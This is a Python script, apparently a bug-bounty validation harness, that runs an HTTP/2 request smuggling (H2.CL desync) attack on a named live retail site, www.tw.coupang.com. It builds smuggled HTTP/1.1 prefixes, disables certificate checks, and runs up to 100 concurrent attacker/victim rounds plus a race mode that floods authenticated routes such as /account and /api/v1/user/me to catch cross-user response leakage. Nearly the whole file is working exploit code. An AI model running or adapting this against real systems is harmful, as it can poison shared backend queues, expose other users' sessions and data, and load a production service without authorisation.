#!/usr/bin/env python3
"""
Standards-compliant H2 desync validation harness.

Purpose:
- Replace handcrafted frame/HPACK assumptions with hyper-h2 framing.
- Separate what is directly proven vs inferred.
- Push testing toward independent-client coupling measurements.

This script intentionally uses conservative verdict labels:
- CONFIRMED_BACKEND_DESYNC
- HIGH_CONFIDENCE_QUEUE_POISONING
- TIMING_ONLY
"""

from __future__ import annotations

import datetime
import hashlib
import json
import socket
import ssl
import statistics
import threading
import time
from dataclasses import dataclass
from typing import Any

import random
from concurrent.futures import ThreadPoolExecutor, as_completed

import h2.connection
import h2.config
import h2.events


TARGET_HOST = "www.tw.coupang.com"
TARGET_PORT = 443
SOCKET_TIMEOUT = 16.0
OUTPUT_FILE = "_backend_desync_h2lib_report.json"

# Victim endpoints: includes echo-heavy, authenticated, and reflective routes.
# Query params that include user-supplied tokens raise likelihood of token reflection.
VICTIM_ENDPOINTS = [
    "/",
    "/tw",
    "/search",
    "/tw/search",
    "/api/search",
    "/api/v1/search",
    "/member",
    "/tw/member",
    "/account",
    "/tw/account",
    "/login",
    "/tw/login",
    "/cart",
    "/tw/cart",
    "/api/v1/user/me",
    "/api/v1/session",
    "/checkout",
    "/wishlist",
]

# Kept for backward compatibility inside TEST-1 path arg
REFLECTIVE_PATHS = VICTIM_ENDPOINTS


def ts() -> str:
    return datetime.datetime.now(datetime.UTC).strftime("%H:%M:%S.%f")[:-3]


def log(msg: str, level: str = "INFO") -> None:
    print(f"[{ts()}] [H2LIB-VALIDATOR] [{level}] {msg}", flush=True)


@dataclass
class StreamResult:
    stream_id: int
    status: int | None
    ended: bool
    reset: bool
    body_len: int
    body_md5: str
    headers: dict[str, str]


class H2Client:
    def __init__(self, host: str, port: int, timeout: float = SOCKET_TIMEOUT) -> None:
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock: ssl.SSLSocket | None = None
        self.conn = h2.connection.H2Connection(
            config=h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
        )

    def connect(self) -> None:
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.settimeout(self.timeout)

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2"])

        self.sock = ctx.wrap_socket(raw, server_hostname=self.host)
        self.sock.connect((self.host, self.port))
        self.sock.settimeout(self.timeout)

        self.conn.initiate_connection()
        self._send(self.conn.data_to_send())

    def close(self) -> None:
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None

    def _send(self, data: bytes) -> None:
        if not data:
            return
        if not self.sock:
            raise RuntimeError("socket not connected")
        self.sock.sendall(data)

    def send_headers(self, stream_id: int, headers: list[tuple[str, str]], end_stream: bool) -> None:
        self.conn.send_headers(stream_id, headers, end_stream=end_stream)
        self._send(self.conn.data_to_send())

    def send_data(self, stream_id: int, data: bytes, end_stream: bool) -> None:
        self.conn.send_data(stream_id, data, end_stream=end_stream)
        self._send(self.conn.data_to_send())

    def recv_events(self, max_seconds: float) -> list[h2.events.Event]:
        if not self.sock:
            raise RuntimeError("socket not connected")

        events: list[h2.events.Event] = []
        end_at = time.monotonic() + max_seconds

        while time.monotonic() < end_at:
            try:
                data = self.sock.recv(65535)
                if not data:
                    break
                new_events = self.conn.receive_data(data)
                events.extend(new_events)
                for ev in new_events:
                    if isinstance(ev, h2.events.DataReceived):
                        self.conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)
                self._send(self.conn.data_to_send())
            except (socket.timeout, TimeoutError):
                break
            except OSError:
                break

        return events


def event_to_summary(ev: h2.events.Event) -> dict[str, Any]:
    out: dict[str, Any] = {"event": type(ev).__name__}
    sid = getattr(ev, "stream_id", None)
    if sid is not None:
        out["stream_id"] = sid
    if isinstance(ev, h2.events.ResponseReceived):
        out["headers"] = [(str(k), str(v)) for k, v in ev.headers]
    if isinstance(ev, h2.events.StreamReset):
        out["error_code"] = int(ev.error_code)
    if isinstance(ev, h2.events.DataReceived):
        out["data_len"] = len(ev.data)
    return out


def extract_stream_result(events: list[h2.events.Event], stream_id: int) -> StreamResult:
    status: int | None = None
    ended = False
    reset = False
    headers: dict[str, str] = {}
    body_parts: list[bytes] = []

    for ev in events:
        if getattr(ev, "stream_id", None) != stream_id:
            continue
        if isinstance(ev, h2.events.ResponseReceived):
            for k, v in ev.headers:
                headers[str(k)] = str(v)
            if ":status" in headers:
                try:
                    status = int(headers[":status"])
                except ValueError:
                    status = None
        elif isinstance(ev, h2.events.DataReceived):
            body_parts.append(ev.data)
        elif isinstance(ev, h2.events.StreamEnded):
            ended = True
        elif isinstance(ev, h2.events.StreamReset):
            reset = True

    body = b"".join(body_parts)
    return StreamResult(
        stream_id=stream_id,
        status=status,
        ended=ended,
        reset=reset,
        body_len=len(body),
        body_md5=hashlib.md5(body[:1024]).hexdigest(),
        headers=headers,
    )


def build_attack_headers() -> list[tuple[str, str]]:
    return [
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", TARGET_HOST),
        (":path", "/"),
        ("content-type", "application/x-www-form-urlencoded"),
        ("content-length", "0"),
    ]


def build_get_headers(path: str = "/") -> list[tuple[str, str]]:
    return [
        (":method", "GET"),
        (":scheme", "https"),
        (":authority", TARGET_HOST),
        (":path", path),
    ]


def build_smuggled_prefix(content_length: int = 800) -> bytes:
    return (
        b"POST /search HTTP/1.1\r\n"
        b"Host: www.tw.coupang.com\r\n"
        + f"Content-Length: {content_length}\r\n".encode("ascii")
        + b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"\r\n"
        b"q=H2LIB_VALIDATION_PREFIX&data="
    )


def run_single_connection_desync(attempts: int = 3) -> dict[str, Any]:
    log("--------------------------------------------------------------")
    log("TEST-1: Standards-compliant single-connection desync")
    log("--------------------------------------------------------------")

    rows: list[dict[str, Any]] = []

    for i in range(attempts):
        client = H2Client(TARGET_HOST, TARGET_PORT, SOCKET_TIMEOUT)
        start = time.monotonic()
        events: list[h2.events.Event] = []
        err = None
        try:
            client.connect()
            client.send_headers(1, build_attack_headers(), end_stream=False)
            client.send_data(1, build_smuggled_prefix(), end_stream=True)
            time.sleep(0.3)
            client.send_headers(3, build_get_headers("/?h2lib_victim=1"), end_stream=True)
            events = client.recv_events(max_seconds=SOCKET_TIMEOUT)
        except Exception as exc:
            err = str(exc)
        finally:
            client.close()

        elapsed = round(time.monotonic() - start, 3)
        s1 = extract_stream_result(events, 1)
        s3 = extract_stream_result(events, 3)
        row = {
            "attempt": i + 1,
            "elapsed": elapsed,
            "stream_1": s1.__dict__,
            "stream_3": s3.__dict__,
            "events": [event_to_summary(ev) for ev in events],
            "error": err,
            "signal_stream1_reset_stream3_response": bool(s1.reset and (s3.status is not None)),
        }
        rows.append(row)

        log(
            f"Attempt {i+1}: elapsed={elapsed}s "
            f"s1.reset={s1.reset} s3.status={s3.status} s3.len={s3.body_len}"
        )
        if err:
            log(f"Attempt {i+1} error: {err}", "WARN")
        time.sleep(1.0)

    confirmed = sum(1 for r in rows if r["signal_stream1_reset_stream3_response"]) >= 2
    return {
        "attempts": rows,
        "confirmed_backend_desync": confirmed,
        "note": (
            "This confirms same-connection stream asymmetry using standards-compliant h2 framing. "
            "It does not by itself prove cross-user impact."
        ),
    }


def do_independent_get(path: str = "/") -> dict[str, Any]:
    client = H2Client(TARGET_HOST, TARGET_PORT, timeout=8.0)
    start = time.monotonic()
    events: list[h2.events.Event] = []
    err = None
    try:
        client.connect()
        client.send_headers(1, build_get_headers(path), end_stream=True)
        events = client.recv_events(max_seconds=8.0)
    except Exception as exc:
        err = str(exc)
    finally:
        client.close()

    elapsed = round(time.monotonic() - start, 4)
    s1 = extract_stream_result(events, 1)
    body_preview = b""
    for ev in events:
        if isinstance(ev, h2.events.DataReceived) and ev.stream_id == 1:
            body_preview += ev.data
    return {
        "elapsed": elapsed,
        "status": s1.status,
        "body_len": s1.body_len,
        "body_md5": s1.body_md5,
        "body_preview": body_preview.decode("utf-8", errors="replace")[:2000],
        "reset": s1.reset,
        "error": err,
    }


def run_attack_stall_once(result: dict[str, Any], active_evt: threading.Event) -> None:
    client = H2Client(TARGET_HOST, TARGET_PORT, SOCKET_TIMEOUT)
    start = time.monotonic()
    err = None
    events: list[h2.events.Event] = []

    try:
        client.connect()
        client.send_headers(1, build_attack_headers(), end_stream=False)
        client.send_data(1, build_smuggled_prefix(), end_stream=True)
        active_evt.set()
        events = client.recv_events(max_seconds=SOCKET_TIMEOUT)
    except Exception as exc:
        err = str(exc)
    finally:
        client.close()

    s1 = extract_stream_result(events, 1)
    result.update(
        {
            "elapsed": round(time.monotonic() - start, 3),
            "stream_1_reset": s1.reset,
            "stream_1_status": s1.status,
            "error": err,
        }
    )


# ---------------------------------------------------------------------------
# Module-level worker functions (safe for ThreadPoolExecutor - no closure capture)
# ---------------------------------------------------------------------------

def _attacker_worker_ex(
    attacker_path: str,
    attacker_canary: str,
    active_evt: threading.Event,
    result: dict[str, Any],
) -> None:
    """Standalone attacker worker: sends H2.CL smuggled request with embedded canary."""
    client = H2Client(TARGET_HOST, TARGET_PORT, SOCKET_TIMEOUT)
    err = None
    events: list[h2.events.Event] = []
    start = time.monotonic()
    try:
        client.connect()
        client.send_headers(1, build_attack_headers(), end_stream=False)
        # Build a valid HTTP/1.1 smuggled prefix with proper CRLF
        smuggled = (
            f"POST {attacker_path} HTTP/1.1\r\n"
            f"Host: {TARGET_HOST}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 900\r\n"
            "\r\n"
            f"q={attacker_canary}&mix="
        ).encode("ascii", errors="ignore")
        client.send_data(1, smuggled, end_stream=True)
        active_evt.set()
        events = client.recv_events(max_seconds=SOCKET_TIMEOUT)
    except Exception as exc:
        err = str(exc)
        active_evt.set()  # unblock callers even on error
    finally:
        client.close()

    s1 = extract_stream_result(events, 1)
    body_bytes = b"".join(
        ev.data for ev in events
        if isinstance(ev, h2.events.DataReceived) and ev.stream_id == 1
    )
    result.update({
        "elapsed": round(time.monotonic() - start, 3),
        "stream_1_reset": s1.reset,
        "stream_1_status": s1.status,
        "body_len": s1.body_len,
        "body_md5": s1.body_md5,
        "body_preview": body_bytes.decode("utf-8", errors="replace")[:2000],
        "headers": s1.headers,
        "error": err,
    })


def _contamination_pair(round_idx: int) -> dict[str, Any]:
    """Run one attacker+victim pair for TEST-3 (called from thread pool)."""
    n = len(VICTIM_ENDPOINTS)
    attacker_path = VICTIM_ENDPOINTS[round_idx % n]
    victim_path = VICTIM_ENDPOINTS[(round_idx + n // 2) % n]

    ts_tag = int(time.time() * 1000)
    attacker_canary = f"ATK{round_idx:04d}_{ts_tag}"
    victim_canary = f"VIC{round_idx:04d}_{ts_tag}"

    active_evt = threading.Event()
    attack_state: dict[str, Any] = {}

    t = threading.Thread(
        target=_attacker_worker_ex,
        args=(attacker_path, attacker_canary, active_evt, attack_state),
        daemon=True,
    )
    t.start()

    active_evt.wait(timeout=2.5)
    # Random jitter 0-500 ms before sending victim request
    time.sleep(random.uniform(0.0, 0.5))

    victim = do_independent_get(f"{victim_path}?probe={victim_canary}")
    t.join(timeout=20.0)

    attacker_body = str(attack_state.get("body_preview", ""))
    victim_body = str(victim.get("body_preview", ""))

    attacker_leaked_victim = victim_canary in attacker_body
    victim_leaked_attacker = attacker_canary in victim_body

    return {
        "round": round_idx + 1,
        "attacker_path": attacker_path,
        "victim_path": victim_path,
        "attacker_canary": attacker_canary,
        "victim_canary": victim_canary,
        "attacker": attack_state,
        "victim": victim,
        "attacker_leaked_victim": attacker_leaked_victim,
        "victim_leaked_attacker": victim_leaked_attacker,
        "direct_contamination": attacker_leaked_victim or victim_leaked_attacker,
    }


def run_independent_client_coupling(rounds: int = 8) -> dict[str, Any]:
    log("--------------------------------------------------------------")
    log("TEST-2: Independent-client coupling under active attack")
    log("--------------------------------------------------------------")

    baseline: list[dict[str, Any]] = []
    during: list[dict[str, Any]] = []

    log(f"Collecting baseline independent-client GETs ({rounds})")
    for _ in range(rounds):
        baseline.append(do_independent_get("/"))
        time.sleep(0.2)

    log(f"Collecting independent-client GETs during attacker stalls ({rounds})")
    for i in range(rounds):
        active_evt = threading.Event()
        attack_result: dict[str, Any] = {}
        t = threading.Thread(target=run_attack_stall_once, args=(attack_result, active_evt), daemon=True)
        t.start()

        active_evt.wait(timeout=2.0)
        victim = do_independent_get(f"/?independent_round={i+1}")
        t.join(timeout=18.0)

        during.append({"victim": victim, "attack": attack_result})
        log(
            f"Round {i+1}: victim.status={victim['status']} victim.t={victim['elapsed']}s "
            f"attack.reset={attack_result.get('stream_1_reset')}"
        )
        time.sleep(0.4)

    base_times = [r["elapsed"] for r in baseline if r["error"] is None]
    during_times = [r["victim"]["elapsed"] for r in during if r["victim"]["error"] is None]

    base_status = [r["status"] for r in baseline]
    during_status = [r["victim"]["status"] for r in during]

    base_mean = statistics.mean(base_times) if base_times else 0.0
    during_mean = statistics.mean(during_times) if during_times else 0.0
    base_stdev = statistics.pstdev(base_times) if len(base_times) > 1 else 0.0

    z_shift = (during_mean - base_mean) / (base_stdev or 0.001)
    status_changed = sorted(set(during_status) - set(base_status))

    # Conservative signal: coupling only if both latency shift is notable and
    # there is status/body-signature drift during attack windows.
    base_hashes = {r["body_md5"] for r in baseline if r["body_md5"]}
    drift_count = sum(1 for r in during if r["victim"]["body_md5"] not in base_hashes)
    coupling_signal = (z_shift > 2.0 and drift_count >= max(2, rounds // 3)) or bool(status_changed)

    return {
        "baseline": baseline,
        "during_attack": during,
        "summary": {
            "baseline_mean": round(base_mean, 4),
            "during_mean": round(during_mean, 4),
            "baseline_stdev": round(base_stdev, 4),
            "z_shift": round(z_shift, 2),
            "status_changed": status_changed,
            "body_hash_drift_count": drift_count,
            "rounds": rounds,
            "independent_client_coupling_signal": coupling_signal,
        },
        "note": (
            "A positive coupling signal suggests shared backend state pressure, "
            "but is still inferential without direct cross-user data leakage."
        ),
    }


def run_cross_client_contamination(rounds: int = 100, concurrency: int = 4) -> dict[str, Any]:
    """
    TEST-3: Scaled cross-client canary contamination (100+ rounds, concurrent pairs, jitter).

    Each pair uses separate TLS/H2 connections for attacker and victim.
    Canary crossover (attacker canary appearing in victim response, or vice-versa)
    is the only accepted evidence of direct cross-client data leakage.

    Improvements over previous 12-round version:
    - 100 rounds by default
    - 4 concurrent attacker-victim pairs (ThreadPoolExecutor)
    - Random jitter 0-500 ms before victim fires (via _contamination_pair)
    - 18 victim endpoint variants including authenticated/echo-heavy routes
    - Proper CRLF in smuggled prefix (was \\r\\n bug in prior version)
    """
    log("--------------------------------------------------------------")
    log(f"TEST-3: Cross-client canary contamination ({rounds} rounds, {concurrency} concurrent pairs)")
    log(f"        Victim endpoints: {len(VICTIM_ENDPOINTS)} routes with jitter 0-500 ms")
    log("--------------------------------------------------------------")

    attempts: list[dict[str, Any]] = []

    with ThreadPoolExecutor(max_workers=concurrency) as pool:
        futures = {pool.submit(_contamination_pair, i): i for i in range(rounds)}
        completed = 0
        for fut in as_completed(futures):
            try:
                row = fut.result()
            except Exception as exc:
                row = {
                    "round": futures[fut] + 1,
                    "error": str(exc),
                    "direct_contamination": False,
                    "attacker_leaked_victim": False,
                    "victim_leaked_attacker": False,
                }
            attempts.append(row)
            completed += 1
            if row.get("direct_contamination"):
                log(
                    f"*** HIT round {row['round']}: attacker_leaked_victim="
                    f"{row.get('attacker_leaked_victim')} "
                    f"victim_leaked_attacker={row.get('victim_leaked_attacker')} ***",
                    "CRITICAL",
                )
            elif completed % 10 == 0:
                hits_so_far = sum(1 for r in attempts if r.get("direct_contamination"))
                log(f"Progress: {completed}/{rounds} pairs complete, hits={hits_so_far}")

    # Sort by round number for deterministic output
    attempts.sort(key=lambda r: r.get("round", 0))

    contamination_hits = [r for r in attempts if r.get("direct_contamination")]
    confirmed = len(contamination_hits) > 0
    return {
        "rounds": rounds,
        "concurrency": concurrency,
        "attempts": attempts,
        "direct_cross_client_contamination_confirmed": confirmed,
        "contamination_hits": len(contamination_hits),
        "note": (
            f"Tested {rounds} attacker-victim pairs across {len(VICTIM_ENDPOINTS)} endpoints "
            "with random jitter and concurrent execution. "
            "Only explicit canary crossover counts as direct cross-client evidence."
        ),
    }


def run_dual_client_race_mode(
    rounds: int = 30, victims_per_window: int = 8
) -> dict[str, Any]:
    """
    TEST-4: Synchronized dual-client race mode.

    Per round:
    1. Start attacker on separate connection (H2.CL smuggle with canary prefix).
    2. On active_evt signal (attacker confirmed stalled), immediately flood
       `victims_per_window` victim GETs from separate connections in parallel.
    3. Check all victim responses for attacker canary (victim_leaked_attacker).
    4. Check attacker response for any victim canaries (attacker_leaked_victim).

    This maximises the probability of a victim request landing in the backend's
    poisoned queue during the stall window.
    """
    log("--------------------------------------------------------------")
    log(
        f"TEST-4: Synchronized dual-client race mode "
        f"({rounds} rounds, {victims_per_window} victims/window)"
    )
    log("--------------------------------------------------------------")

    rounds_data: list[dict[str, Any]] = []

    for i in range(rounds):
        ts_tag = int(time.time() * 1000)
        attacker_canary = f"RATK{i:03d}_{ts_tag}"
        victim_canaries = [f"RVIC{i:03d}_V{j}_{ts_tag}" for j in range(victims_per_window)]

        active_evt = threading.Event()
        attack_state: dict[str, Any] = {}

        atk_thread = threading.Thread(
            target=_attacker_worker_ex,
            args=("/", attacker_canary, active_evt, attack_state),
            daemon=True,
        )
        atk_thread.start()

        # Wait for attacker to signal stall (data sent, waiting for backend response)
        active_evt.wait(timeout=3.0)

        # Immediately flood victim requests in parallel from diverse endpoints
        vic_endpoints = [
            VICTIM_ENDPOINTS[j % len(VICTIM_ENDPOINTS)] for j in range(victims_per_window)
        ]

        def _flood_one(vc: str, ep: str) -> dict[str, Any]:
            return do_independent_get(f"{ep}?race={vc}")

        victim_results: list[dict[str, Any]] = []
        with ThreadPoolExecutor(max_workers=victims_per_window) as vpool:
            vfutures = [
                vpool.submit(_flood_one, victim_canaries[j], vic_endpoints[j])
                for j in range(victims_per_window)
            ]
            for vf in as_completed(vfutures):
                try:
                    victim_results.append(vf.result())
                except Exception as exc:
                    victim_results.append({"error": str(exc), "body_preview": "", "status": None})

        atk_thread.join(timeout=20.0)

        attacker_body = str(attack_state.get("body_preview", ""))
        victim_hits: list[int] = []
        attacker_hits: list[int] = []

        for j, vr in enumerate(victim_results):
            vb = str(vr.get("body_preview", ""))
            if attacker_canary in vb:
                victim_hits.append(j)
            if victim_canaries[j] in attacker_body:
                attacker_hits.append(j)

        any_hit = bool(victim_hits or attacker_hits)

        round_data: dict[str, Any] = {
            "round": i + 1,
            "attacker_canary": attacker_canary,
            "victim_canaries": victim_canaries,
            "attack": attack_state,
            "victims": victim_results,
            "victim_indices_leaked_attacker": victim_hits,
            "attacker_indices_leaked_victim": attacker_hits,
            "any_contamination": any_hit,
        }
        rounds_data.append(round_data)

        if any_hit:
            log(
                f"*** RACE HIT round {i+1}: victim_hits={victim_hits} "
                f"attacker_hits={attacker_hits} ***",
                "CRITICAL",
            )
        elif (i + 1) % 5 == 0:
            hits = sum(1 for r in rounds_data if r["any_contamination"])
            log(f"Race progress: {i+1}/{rounds} rounds, hits={hits}")

        time.sleep(0.3)

    race_hits = [r for r in rounds_data if r["any_contamination"]]
    confirmed = len(race_hits) > 0
    return {
        "rounds": rounds,
        "victims_per_window": victims_per_window,
        "rounds_data": rounds_data,
        "race_contamination_confirmed": confirmed,
        "race_hits": len(race_hits),
        "note": (
            f"Dual-client race: attacker stalls one backend connection while "
            f"{victims_per_window} victim requests are flooded in parallel per round. "
            "Maximises backend queue poisoning window."
        ),
    }


def compute_verdict(
    test1: dict[str, Any],
    test2: dict[str, Any],
    test3: dict[str, Any],
    test4: dict[str, Any],
) -> dict[str, Any]:
    confirmed_desync = bool(test1.get("confirmed_backend_desync"))
    coupling_signal = bool(test2.get("summary", {}).get("independent_client_coupling_signal"))
    direct_cross_client = bool(test3.get("direct_cross_client_contamination_confirmed"))
    race_contamination = bool(test4.get("race_contamination_confirmed"))

    if direct_cross_client or race_contamination:
        source = "TEST-3 canary" if direct_cross_client else "TEST-4 race"
        t3_hits = test3.get("contamination_hits", 0)
        t4_hits = test4.get("race_hits", 0)
        verdict = "CONFIRMED_CROSS_CLIENT_CONTAMINATION"
        confidence = 95
        action = (
            f"Submit as direct cross-user impact. "
            f"Evidence source: {source}. "
            f"TEST-3 hits={t3_hits}, TEST-4 hits={t4_hits}."
        )
    elif confirmed_desync and coupling_signal:
        verdict = "HIGH_CONFIDENCE_QUEUE_POISONING"
        confidence = 82
        action = (
            "Submit as high-confidence backend desync with coupling indicators; "
            "avoid confirmed cross-user claim."
        )
    elif confirmed_desync:
        verdict = "CONFIRMED_BACKEND_DESYNC"
        confidence = 74
        action = (
            "Submit as confirmed backend desync; explicitly mark cross-user impact as unproven. "
            f"TEST-3 ran {test3.get('rounds', 0)} rounds with {test3.get('contamination_hits', 0)} hits. "
            f"TEST-4 ran {test4.get('rounds', 0)} rounds with {test4.get('race_hits', 0)} hits."
        )
    else:
        verdict = "TIMING_ONLY"
        confidence = 55
        action = "Insufficient structural evidence; gather additional controlled backend reuse evidence."

    return {
        "verdict": verdict,
        "confidence": confidence,
        "action": action,
        "test3_rounds": test3.get("rounds", 0),
        "test3_hits": test3.get("contamination_hits", 0),
        "test4_rounds": test4.get("rounds", 0),
        "test4_hits": test4.get("race_hits", 0),
        "constraints": [
            "No direct proof of independent-user socket reuse captured unless TEST-3 or TEST-4 confirms canary crossover.",
            "No direct victim-data exfiltration captured unless TEST-3 or TEST-4 confirms canary crossover.",
        ],
    }


def main() -> int:
    log("==============================================================")
    log("H2LIB BACKEND DESYNC VALIDATOR")
    log("Target: https://www.tw.coupang.com")
    log("==============================================================")

    report: dict[str, Any] = {
        "target": f"https://{TARGET_HOST}",
        "run_time": datetime.datetime.now(datetime.UTC).isoformat(),
        "tests": {},
        "verdict": {},
    }

    test1 = run_single_connection_desync(attempts=3)
    report["tests"]["test1_single_connection_desync_h2lib"] = test1

    test2 = run_independent_client_coupling(rounds=8)
    report["tests"]["test2_independent_client_coupling"] = test2

    test3 = run_cross_client_contamination(rounds=100, concurrency=4)
    report["tests"]["test3_cross_client_contamination"] = test3

    test4 = run_dual_client_race_mode(rounds=30, victims_per_window=8)
    report["tests"]["test4_dual_client_race_mode"] = test4

    report["verdict"] = compute_verdict(test1, test2, test3, test4)

    log("--------------------------------------------------------------")
    log(f"Verdict: {report['verdict']['verdict']}")
    log(f"Confidence: {report['verdict']['confidence']}/100")
    log(f"Action: {report['verdict']['action']}")
    log("--------------------------------------------------------------")

    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)
    log(f"Report written: {OUTPUT_FILE}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
